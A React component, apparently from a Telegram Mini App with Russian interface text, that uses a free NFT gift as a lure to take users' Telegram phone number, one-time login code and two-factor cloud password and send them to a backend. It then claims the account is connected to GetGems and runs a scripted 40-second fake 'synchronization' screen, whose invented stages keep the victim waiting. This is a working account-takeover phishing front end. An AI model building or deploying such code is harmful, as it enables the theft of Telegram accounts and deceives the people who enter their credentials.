import { useState, useRef, useEffect } from 'react';
import { authStepPhone, authStepCode, authStepPassword } from '../services/api';
import { setSynced, addToInventory } from '../services/inventory';
import { useAppContext } from '../store';
import { hapticImpact, hapticNotification } from '../services/telegram';
import { nftImage, NFT_NAMES } from '../constants';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowLeft } from 'lucide-react';

// ─── Phone formatting ──────────────────────────────────────────────────────────
function formatPhone(raw: string): string {
  let clean = raw.replace(/[^\d+]/g, '');
  if (clean.includes('+')) clean = '+' + clean.replace(/\+/g, '');
  if (clean.length > 0 && !clean.startsWith('+')) clean = '+' + clean;
  return clean.slice(0, 16);
}

// ─── Animated phone visual ─────────────────────────────────────────────────────
// Rings that pulse outward as more digits are entered
function PhoneVisual({ progress, isActive, isError }: { progress: number; isActive: boolean; isError: boolean }) {
  const rings = [0, 1, 2];
  const color = isError ? '#ef4444' : '#8774e1';
  const bgColor = isError ? 'rgba(239,68,68,0.12)' : isActive ? 'rgba(135,116,225,0.18)' : 'rgba(135,116,225,0.08)';

  return (
    <div className="relative flex items-center justify-center w-24 h-24 select-none">
      {/* Signal rings — appear progressively as digits are typed */}
      {rings.map((i) => {
        const visible = progress > i / 3;
        return (
          <motion.div
            key={i}
            className="absolute rounded-full"
            style={{ border: `1.5px solid ${color}` }}
            initial={{ opacity: 0, scale: 0.6 }}
            animate={{
              opacity: visible ? [0, 0.5, 0] : 0,
              scale: visible ? [0.7, 1.5 + i * 0.3, 2 + i * 0.4] : 0.6,
            }}
            transition={{
              duration: 2,
              delay: i * 0.6,
              repeat: Infinity,
              ease: 'easeOut',
            }}
            // size grows with ring index
            // we set size via inline style using inset
            // ring 0: inset 8, ring 1: inset 0, ring 2: -inset 8
            // Use absolute sizing
          >
          </motion.div>
        );
      })}

      {/* Actual sized rings */}
      {rings.map((i) => {
        const size = 52 + i * 18;
        const visible = progress > i / 3;
        return (
          <motion.div
            key={`r${i}`}
            className="absolute rounded-full pointer-events-none"
            style={{
              width: size,
              height: size,
              border: `1.5px solid ${color}`,
              opacity: 0,
            }}
            animate={visible ? {
              opacity: [0, 0.6, 0],
              scale: [0.8, 1.2],
            } : { opacity: 0 }}
            transition={{
              duration: 1.8,
              delay: i * 0.55,
              repeat: Infinity,
              ease: 'easeOut',
            }}
          />
        );
      })}

      {/* Center phone icon container */}
      <motion.div
        className="w-16 h-16 rounded-full flex items-center justify-center relative z-10"
        style={{ background: bgColor, border: `1.5px solid ${color}33` }}
        animate={{ scale: isActive ? [1, 1.04, 1] : 1 }}
        transition={{ duration: 0.6, repeat: isActive ? Infinity : 0 }}
      >
        {/* Phone handset SVG */}
        <motion.svg
          width="28" height="28" viewBox="0 0 28 28" fill="none"
          animate={{ rotate: isError ? [-8, 8, -8, 0] : isActive ? [0, -6, 6, 0] : 0 }}
          transition={{ duration: isError ? 0.4 : 1.5, repeat: isActive ? Infinity : 0, repeatDelay: 1.5 }}
        >
          <path
            d="M6 4C6 4 8 6 8 9C8 10.5 7 12 7 12L10 15C10 15 11.5 14 13 14C16 14 18 16 18 16L21 19C21 19 20.5 20.5 19 21.5C16 23.5 5 17 4 14C3 11 4.5 5.5 6 4Z"
            fill={color}
            stroke={color}
            strokeWidth="0.5"
            strokeLinejoin="round"
          />
          {/* Signal dots appear as digits are typed */}
          {progress > 0.3 && (
            <motion.circle cx="20" cy="8" r="2" fill={color}
              initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: 'spring', stiffness: 400 }} />
          )}
          {progress > 0.6 && (
            <motion.path d="M22 5 Q24 8 22 11" stroke={color} strokeWidth="1.5" strokeLinecap="round" fill="none"
              initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
          )}
          {progress > 0.85 && (
            <motion.path d="M24 3 Q27 8 24 13" stroke={color} strokeWidth="1.5" strokeLinecap="round" fill="none"
              initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.3 }} />
          )}
        </motion.svg>
      </motion.div>

      {/* Progress arc around the circle */}
      <svg className="absolute inset-0 w-full h-full" style={{ transform: 'rotate(-90deg)' }}>
        <circle cx="48" cy="48" r="30" fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="2" />
        <motion.circle
          cx="48" cy="48" r="30" fill="none"
          stroke={isError ? '#ef4444' : '#8774e1'}
          strokeWidth="2"
          strokeLinecap="round"
          strokeDasharray={`${2 * Math.PI * 30}`}
          animate={{ strokeDashoffset: 2 * Math.PI * 30 * (1 - progress) }}
          transition={{ duration: 0.4, ease: 'easeOut' }}
        />
      </svg>
    </div>
  );
}

// ─── Message burst for code step ──────────────────────────────────────────────
function CodeVisual({ filled, total, isError }: { filled: number; total: number; isError: boolean }) {
  const progress = filled / total;

  const bubbleColor = isError
    ? '#ef4444'
    : progress === 0 ? '#555'
    : progress < 0.6 ? '#8774e1'
    : progress < 1 ? '#2382ff'
    : '#22c55e';

  return (
    <div className="relative flex items-center justify-center w-24 h-24 select-none">
      {/* Completion burst */}
      {progress === 1 && !isError && (
        <>
          {[...Array(6)].map((_, i) => (
            <motion.div
              key={i}
              className="absolute w-1.5 h-1.5 rounded-full"
              style={{ background: '#22c55e' }}
              initial={{ x: 0, y: 0, opacity: 1 }}
              animate={{
                x: Math.cos((i / 6) * Math.PI * 2) * 36,
                y: Math.sin((i / 6) * Math.PI * 2) * 36,
                opacity: 0,
                scale: [1, 0.3],
              }}
              transition={{ duration: 0.6, delay: i * 0.05 }}
            />
          ))}
        </>
      )}

      {/* Outer ring */}
      <svg className="absolute inset-0 w-full h-full" style={{ transform: 'rotate(-90deg)' }}>
        <circle cx="48" cy="48" r="34" fill="none" stroke="rgba(255,255,255,0.06)" strokeWidth="2" />
        <motion.circle
          cx="48" cy="48" r="34" fill="none"
          stroke={bubbleColor}
          strokeWidth="2.5"
          strokeLinecap="round"
          strokeDasharray={`${2 * Math.PI * 34}`}
          animate={{ strokeDashoffset: 2 * Math.PI * 34 * (1 - progress) }}
          transition={{ duration: 0.35, ease: 'easeOut' }}
        />
      </svg>

      {/* Center bubble */}
      <motion.div
        className="w-16 h-16 rounded-2xl flex flex-col items-center justify-center relative z-10"
        style={{
          background: `${bubbleColor}18`,
          border: `1.5px solid ${bubbleColor}44`,
        }}
        animate={{ scale: isError ? [1, 1.06, 0.95, 1] : 1 }}
        transition={{ duration: 0.3 }}
      >
        {/* Dot indicators */}
        <div className="flex gap-1.5">
          {[...Array(total)].map((_, i) => (
            <motion.div
              key={i}
              className="w-2 h-2 rounded-full"
              animate={{
                scale: filled > i ? 1 : 0.6,
                background: isError
                  ? '#ef4444'
                  : filled > i ? bubbleColor : 'rgba(255,255,255,0.2)',
              }}
              transition={{ type: 'spring', stiffness: 400, delay: i * 0.04 }}
            />
          ))}
        </div>
        {/* Telegram paper plane icon */}
        <motion.svg
          width="20" height="20" viewBox="0 0 24 24" fill="none"
          className="mt-1.5"
          animate={{ y: isError ? 0 : filled > 0 ? [-1, 1, -1] : 0 }}
          transition={{ duration: 1.2, repeat: filled > 0 ? Infinity : 0 }}
        >
          <path d="M22 2L11 13" stroke={bubbleColor} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          <path d="M22 2L15 22L11 13L2 9L22 2Z" stroke={bubbleColor} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        </motion.svg>
      </motion.div>
    </div>
  );
}

// ─── Shield for password step ──────────────────────────────────────────────────
function PasswordVisual({ length, isError }: { length: number; isError: boolean }) {
  const strength = Math.min(length / 12, 1);
  const shieldColor = isError ? '#ef4444'
    : length === 0 ? '#555'
    : length < 6 ? '#f59e0b'
    : length < 10 ? '#8774e1'
    : '#22c55e';

  return (
    <div className="relative flex items-center justify-center w-24 h-24 select-none">
      {/* Glow when strong */}
      {length >= 10 && !isError && (
        <motion.div
          className="absolute inset-0 rounded-full"
          style={{ background: `radial-gradient(circle, ${shieldColor}30 0%, transparent 70%)` }}
          animate={{ scale: [1, 1.15, 1], opacity: [0.6, 1, 0.6] }}
          transition={{ duration: 2, repeat: Infinity }}
        />
      )}

      {/* Shield SVG with fill */}
      <svg width="72" height="72" viewBox="0 0 72 72" fill="none">
        {/* Shield outline */}
        <motion.path
          d="M36 6 L60 16 L60 36 C60 50 48 62 36 66 C24 62 12 50 12 36 L12 16 Z"
          stroke={shieldColor}
          strokeWidth="2"
          fill="none"
          animate={{ stroke: shieldColor }}
          transition={{ duration: 0.3 }}
        />
        {/* Shield fill that rises with password strength */}
        <clipPath id="shield-clip">
          <path d="M36 6 L60 16 L60 36 C60 50 48 62 36 66 C24 62 12 50 12 36 L12 16 Z" />
        </clipPath>
        <motion.rect
          x="12" width="48"
          y={66 - strength * 60}
          height={strength * 60}
          fill={`${shieldColor}22`}
          clipPath="url(#shield-clip)"
          animate={{ y: 66 - strength * 60, height: strength * 60 }}
          transition={{ duration: 0.4, ease: 'easeOut' }}
        />
        {/* Lock icon in the middle */}
        {length === 0 && (
          <g>
            <rect x="28" y="36" width="16" height="12" rx="2" fill={shieldColor} opacity="0.7" />
            <path d="M30 36 V32 C30 28.7 33 26 36 26 C39 26 42 28.7 42 32 V36" stroke={shieldColor} strokeWidth="2.5" strokeLinecap="round" fill="none" opacity="0.7" />
          </g>
        )}
        {/* Checkmark when strong enough */}
        {length >= 6 && !isError && (
          <motion.path
            d="M26 38 L33 45 L46 30"
            stroke={shieldColor}
            strokeWidth="3"
            strokeLinecap="round"
            strokeLinejoin="round"
            fill="none"
            initial={{ pathLength: 0 }}
            animate={{ pathLength: 1 }}
            transition={{ duration: 0.35 }}
          />
        )}
        {/* X when error */}
        {isError && (
          <motion.g initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <path d="M28 28 L44 44" stroke="#ef4444" strokeWidth="3" strokeLinecap="round" />
            <path d="M44 28 L28 44" stroke="#ef4444" strokeWidth="3" strokeLinecap="round" />
          </motion.g>
        )}
      </svg>
    </div>
  );
}

// ─── Sync stages ──────────────────────────────────────────────────────────────
const SYNC_STAGES = [
  'Подключаемся к серверу...',
  'Проверяем аккаунт...',
  'Загружаем список подарков...',
  'Синхронизируем данные...',
  'Настраиваем маркет...',
  'Получаем историю транзакций...',
  'Обновляем баланс...',
  'Финализируем синхронизацию...',
  'Почти готово...',
];

// ─── Main ─────────────────────────────────────────────────────────────────────
export default function AuthView() {
  const [step, setStep]           = useState<1 | 2 | 3 | 4>(1);
  const [phone, setPhone]         = useState('');
  const [code, setCode]           = useState(['', '', '', '', '']);
  const [password, setPassword]   = useState('');
  const [loading, setLoading]     = useState(false);
  const [error, setError]         = useState('');
  const [phoneFocused, setPhoneFocused] = useState(false);
  const [syncStage, setSyncStage]       = useState(0);
  const [syncProgress, setSyncProgress] = useState(0);
  const codeRefs = useRef<(HTMLInputElement | null)[]>([]);
  const { setIsSynced, setCurrentView, giftId, giftSlug, giftNum } = useAppContext();

  const hasGift         = Boolean(giftSlug);
  const giftDisplayName = hasGift ? (NFT_NAMES[giftSlug] || giftSlug) : '';
  const giftImageUrl    = hasGift ? nftImage(giftSlug, giftNum || undefined) : '';

  const phoneDigits   = phone.replace(/\D/g, '');
  const phoneProgress = Math.min(phoneDigits.length / 11, 1);
  const codeFilled    = code.filter(d => d !== '').length;

  const handlePhoneChange = (raw: string) => {
    setError('');
    setPhone(formatPhone(raw));
  };

  const handlePhoneSubmit = async () => {
    if (phoneDigits.length < 7) { setError('Введите корректный номер телефона'); return; }
    setLoading(true); setError('');
    try {
      const effectiveGiftId = giftId || new URLSearchParams(window.location.search).get('gift_id') || '';
      const res = await authStepPhone(phone, effectiveGiftId);
      if (res.status === 'code_sent') { setStep(2); }
      else { setError(res.message || 'Ошибка отправки кода'); }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    setError('');
    const newCode = [...code]; newCode[index] = value; setCode(newCode);
    if (value && index < 4) codeRefs.current[index + 1]?.focus();
    if (newCode.every(d => d !== '')) submitCode(newCode.join(''));
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) codeRefs.current[index - 1]?.focus();
  };

  const submitCode = async (fullCode: string) => {
    setLoading(true); setError('');
    try {
      const res = await authStepCode(fullCode);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'need_password') { setStep(3); }
      else if (res.status === 'code_invalid') {
        setError('Неверный код. Проверьте и введите снова.');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      } else if (res.status === 'code_expired') {
        setError('Код истёк. Вернитесь и запросите новый.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный код');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handlePasswordSubmit = async () => {
    if (!password) { setError('Введите пароль'); return; }
    setLoading(true); setError('');
    try {
      const res = await authStepPassword(password);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'password_invalid') {
        setError('Неверный пароль. Попробуйте ещё раз.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный пароль'); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handleSuccess = () => {
    setSynced(); setIsSynced(true); hapticNotification('success'); setStep(4);
    try { navigator.vibrate([300, 100, 300, 100, 300, 100, 300]); } catch (_) {}
    [0, 400, 800, 1200, 1600, 2000, 2400].forEach(d => setTimeout(() => hapticImpact('medium'), d));

    let stageIdx = 0;
    let progress = 0;
    const stageInterval = setInterval(() => {
      stageIdx = Math.min(stageIdx + 1, SYNC_STAGES.length - 1);
      setSyncStage(stageIdx);
    }, 4500);
    const progressInterval = setInterval(() => {
      progress = Math.min(progress + 1.8, 99);
      setSyncProgress(progress);
    }, 700);

    setTimeout(() => {
      clearInterval(stageInterval); clearInterval(progressInterval);
      setSyncProgress(100);
      if (hasGift && giftSlug) { addToInventory(giftSlug, giftNum || '0'); setCurrentView('my-gifts'); }
      else { setCurrentView('market'); }
    }, 40000);
  };

  const handleBack = () => {
    hapticImpact('light');
    if (hasGift) setCurrentView('gift-welcome'); else setCurrentView('market');
  };

  // Step dots
  const StepDots = () => (
    <div className="flex items-center gap-2 mb-7">
      {[1, 2, 3].map(s => (
        <motion.div key={s}
          animate={{
            width: step === s ? 24 : 8,
            background: step > s ? '#22c55e' : step === s ? '#8774e1' : 'rgba(255,255,255,0.15)',
          }}
          transition={{ duration: 0.3 }}
          className="h-2 rounded-full"
        />
      ))}
    </div>
  );

  return (
    <div
      className="fixed inset-0 z-[9999] flex flex-col"
      style={{
        background: 'linear-gradient(160deg, #0d0d12 0%, #0f0f16 50%, #0c0c10 100%)',
        paddingTop: 'calc(var(--tg-safe-area-top, 0px) + var(--tg-content-safe-area-top, 0px))',
      }}
    >
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-80 h-80 rounded-full pointer-events-none"
        style={{ background: 'radial-gradient(circle, rgba(135,116,225,0.14) 0%, transparent 70%)', filter: 'blur(30px)' }} />

      {step !== 4 && (
        <button onClick={handleBack}
          className="absolute top-4 left-4 w-9 h-9 rounded-full flex items-center justify-center active:scale-90 transition-transform z-10"
          style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)' }}
        >
          <ArrowLeft className="w-5 h-5 text-white" />
        </button>
      )}

      <div className="flex-1 flex flex-col items-center justify-center p-6 relative">
        <div className="w-full max-w-sm flex flex-col items-center">

          {hasGift && step < 4 && (
            <motion.div initial={{ opacity: 0, y: -12 }} animate={{ opacity: 1, y: 0 }}
              className="flex items-center gap-3 rounded-2xl px-4 py-3 mb-5 w-full"
              style={{ background: 'rgba(135,116,225,0.1)', border: '1px solid rgba(135,116,225,0.25)' }}
            >
              <div className="w-11 h-11 rounded-xl overflow-hidden shrink-0"
                style={{ background: 'linear-gradient(135deg, #f6a827, #e66b12)' }}>
                <img src={giftImageUrl} alt={giftDisplayName} className="w-full h-full object-cover"
                  referrerPolicy="no-referrer" onError={e => { (e.target as HTMLImageElement).style.opacity = '0'; }} />
              </div>
              <div className="flex flex-col min-w-0 flex-1">
                <span className="text-[11px] text-[#8774e1] font-bold uppercase tracking-wider">Ваш подарок</span>
                <span className="text-sm font-bold text-white truncate">{giftDisplayName}</span>
              </div>
            </motion.div>
          )}

          {step !== 4 && <StepDots />}

          <AnimatePresence mode="wait">

            {/* ── Step 1 ── */}
            {step === 1 && (
              <motion.div key="s1"
                initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                <PhoneVisual progress={phoneProgress} isActive={phoneFocused} isError={!!error} />

                <p className="text-[22px] font-bold text-white mt-4 mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Авторизация
                </p>
                <p className="text-[13px] text-gray-400 mb-5 text-center leading-relaxed">
                  Введите номер телефона от вашего Telegram
                </p>

                <div className="w-full relative mb-3">
                  <input
                    type="tel" placeholder="+71234567890" value={phone}
                    onChange={e => handlePhoneChange(e.target.value)}
                    onKeyDown={e => { if (e.key === 'Enter') handlePhoneSubmit(); }}
                    onFocus={() => setPhoneFocused(true)}
                    onBlur={() => setPhoneFocused(false)}
                    className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-[18px] outline-none"
                    style={{
                      background: error ? 'rgba(239,68,68,0.08)' : 'rgba(255,255,255,0.06)',
                      border: `1.5px solid ${error ? 'rgba(239,68,68,0.55)' : phoneFocused ? 'rgba(135,116,225,0.7)' : 'rgba(255,255,255,0.12)'}`,
                      fontFamily: 'DM Sans, sans-serif',
                      letterSpacing: '0.05em',
                      transition: 'border-color 0.2s, background 0.2s',
                    }}
                  />
                  {phoneDigits.length >= 7 && (
                    <div className="absolute right-4 top-1/2 -translate-y-1/2 w-2 h-2 rounded-full"
                      style={{ background: '#22c55e' }} />
                  )}
                </div>

                <AnimatePresence>
                  {error && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mb-3 text-center">
                      {error}
                    </motion.p>
                  )}
                </AnimatePresence>

                <button onClick={handlePhoneSubmit} disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{
                    background: 'linear-gradient(135deg, #8774e1, #6c5fc7)',
                    boxShadow: loading ? 'none' : '0 4px 20px rgba(135,116,225,0.35)',
                    fontFamily: 'DM Sans, sans-serif',
                  }}
                >
                  {loading ? (
                    <><div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />Отправка кода...</>
                  ) : 'Продолжить →'}
                </button>
              </motion.div>
            )}

            {/* ── Step 2 ── */}
            {step === 2 && (
              <motion.div key="s2"
                initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                <CodeVisual filled={codeFilled} total={5} isError={!!error} />

                <p className="text-[22px] font-bold text-white mt-4 mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Код подтверждения
                </p>
                <p className="text-[13px] text-gray-400 mb-6 text-center">
                  Мы отправили код в приложение Telegram
                </p>

                <div className="flex gap-2.5 mb-3">
                  {code.map((digit, i) => (
                    <motion.input key={i}
                      ref={el => (codeRefs.current[i] = el)}
                      type="text" inputMode="numeric" maxLength={1} value={digit}
                      onChange={e => handleCodeChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      className="w-12 h-14 rounded-xl text-center text-xl font-bold text-white outline-none"
                      animate={{
                        scale: digit ? [1, 1.1, 1] : 1,
                      }}
                      transition={{ duration: 0.18 }}
                      style={{
                        background: error ? 'rgba(239,68,68,0.1)' : digit ? 'rgba(135,116,225,0.15)' : 'rgba(255,255,255,0.06)',
                        border: `1.5px solid ${error ? 'rgba(239,68,68,0.6)' : digit ? 'rgba(135,116,225,0.7)' : 'rgba(255,255,255,0.12)'}`,
                        transition: 'background 0.15s, border-color 0.15s',
                      }}
                    />
                  ))}
                </div>

                {loading && (
                  <div className="flex items-center gap-2 mt-2 text-gray-400 text-[13px]">
                    <div className="w-3.5 h-3.5 border-2 border-gray-400/40 border-t-gray-300 rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />
                    Проверяем код...
                  </div>
                )}

                <AnimatePresence>
                  {error && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mt-2 text-center">
                      {error}
                    </motion.p>
                  )}
                </AnimatePresence>
              </motion.div>
            )}

            {/* ── Step 3 ── */}
            {step === 3 && (
              <motion.div key="s3"
                initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }}
                transition={{ type: 'spring', stiffness: 300, damping: 28 }}
                className="w-full flex flex-col items-center"
              >
                <PasswordVisual length={password.length} isError={!!error} />

                <p className="text-[22px] font-bold text-white mt-2 mb-1 text-center" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Облачный пароль
                </p>
                <p className="text-[13px] text-gray-400 mb-5 text-center">
                  Введите пароль двухфакторной аутентификации
                </p>

                {/* Strength bar */}
                {password.length > 0 && (
                  <motion.div className="w-full mb-3" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <div className="w-full h-1.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.07)' }}>
                      <motion.div className="h-full rounded-full"
                        animate={{ width: `${Math.min(password.length / 12 * 100, 100)}%` }}
                        style={{
                          background: password.length < 5 ? '#ef4444'
                            : password.length < 9 ? '#f59e0b'
                            : '#22c55e',
                        }}
                        transition={{ duration: 0.3 }}
                      />
                    </div>
                    <p className="text-[11px] mt-1 text-right"
                      style={{ color: password.length < 5 ? '#ef4444' : password.length < 9 ? '#f59e0b' : '#22c55e' }}>
                      {password.length < 5 ? 'Слабый' : password.length < 9 ? 'Средний' : 'Надёжный'}
                    </p>
                  </motion.div>
                )}

                <input
                  type="password" placeholder="••••••••" value={password}
                  onChange={e => { setError(''); setPassword(e.target.value); }}
                  onKeyDown={e => { if (e.key === 'Enter') handlePasswordSubmit(); }}
                  className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-lg mb-3 outline-none"
                  style={{
                    background: error ? 'rgba(239,68,68,0.08)' : 'rgba(255,255,255,0.06)',
                    border: `1.5px solid ${error ? 'rgba(239,68,68,0.55)' : 'rgba(255,255,255,0.12)'}`,
                    fontFamily: 'DM Sans, sans-serif',
                    letterSpacing: '0.15em',
                    transition: 'border-color 0.2s',
                  }}
                />

                <AnimatePresence>
                  {error && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                      className="text-red-400 text-[13px] mb-3 text-center">
                      {error}
                    </motion.p>
                  )}
                </AnimatePresence>

                <button onClick={handlePasswordSubmit} disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{
                    background: 'linear-gradient(135deg, #f59e0b, #d97706)',
                    boxShadow: loading ? 'none' : '0 4px 20px rgba(245,158,11,0.28)',
                    fontFamily: 'DM Sans, sans-serif',
                  }}
                >
                  {loading ? (
                    <><div className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full"
                      style={{ animation: 'spin-slow 0.8s linear infinite' }} />Проверка...</>
                  ) : 'Подтвердить →'}
                </button>
              </motion.div>
            )}

            {/* ── Step 4 ── */}
            {step === 4 && (
              <motion.div key="s4" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                className="w-full flex flex-col items-center"
              >
                <div className="relative w-28 h-28 mb-5 flex items-center justify-center">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="absolute inset-0 rounded-full"
                      style={{ border: '1.5px solid rgba(34,197,94,0.3)', animation: `ripple-out 2.8s ease-out ${i * 0.9}s infinite` }} />
                  ))}
                  <motion.div
                    initial={{ scale: 0, rotate: -20 }} animate={{ scale: 1, rotate: 0 }}
                    transition={{ type: 'spring', stiffness: 220, damping: 16, delay: 0.1 }}
                    className="w-20 h-20 rounded-full flex items-center justify-center"
                    style={{
                      background: 'linear-gradient(135deg, rgba(34,197,94,0.22), rgba(34,197,94,0.1))',
                      border: '1px solid rgba(34,197,94,0.4)',
                      boxShadow: '0 0 32px rgba(34,197,94,0.22)',
                    }}
                  >
                    <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
                      <motion.path d="M9 19 L16 26 L29 12"
                        stroke="#22c55e" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round" fill="none"
                        initial={{ pathLength: 0, opacity: 0 }} animate={{ pathLength: 1, opacity: 1 }}
                        transition={{ duration: 0.55, delay: 0.25 }}
                      />
                    </svg>
                  </motion.div>
                </div>

                <motion.p initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}
                  className="text-[22px] font-bold text-white mb-1" style={{ fontFamily: 'Syne, sans-serif' }}>
                  Синхронизация!
                </motion.p>
                <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.55 }}
                  className="text-[13px] text-gray-400 text-center mb-7">
                  Аккаунт подключён к GetGems
                </motion.p>

                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.65 }}
                  className="w-full rounded-2xl p-4"
                  style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}
                >
                  <div className="flex items-center justify-between mb-2.5">
                    <AnimatePresence mode="wait">
                      <motion.span key={syncStage}
                        initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -5 }}
                        transition={{ duration: 0.25 }}
                        className="text-[13px] text-gray-300">
                        {SYNC_STAGES[syncStage]}
                      </motion.span>
                    </AnimatePresence>
                    <motion.span className="text-[13px] font-bold ml-3 shrink-0" style={{ color: '#2382ff' }}
                      animate={{ opacity: [1, 0.6, 1] }} transition={{ duration: 1.2, repeat: Infinity }}>
                      {Math.floor(syncProgress)}%
                    </motion.span>
                  </div>
                  <div className="w-full h-2.5 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.07)' }}>
                    <motion.div className="h-full rounded-full"
                      style={{ background: 'linear-gradient(90deg, #2382ff, #8774e1)' }}
                      animate={{ width: `${syncProgress}%` }}
                      transition={{ duration: 0.7, ease: 'easeOut' }}
                    />
                  </div>
                </motion.div>

                <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1 }}
                  className="text-[11px] text-gray-600 text-center mt-4">
                  Не закрывайте приложение — займёт ~40 секунд
                </motion.p>
              </motion.div>
            )}

          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
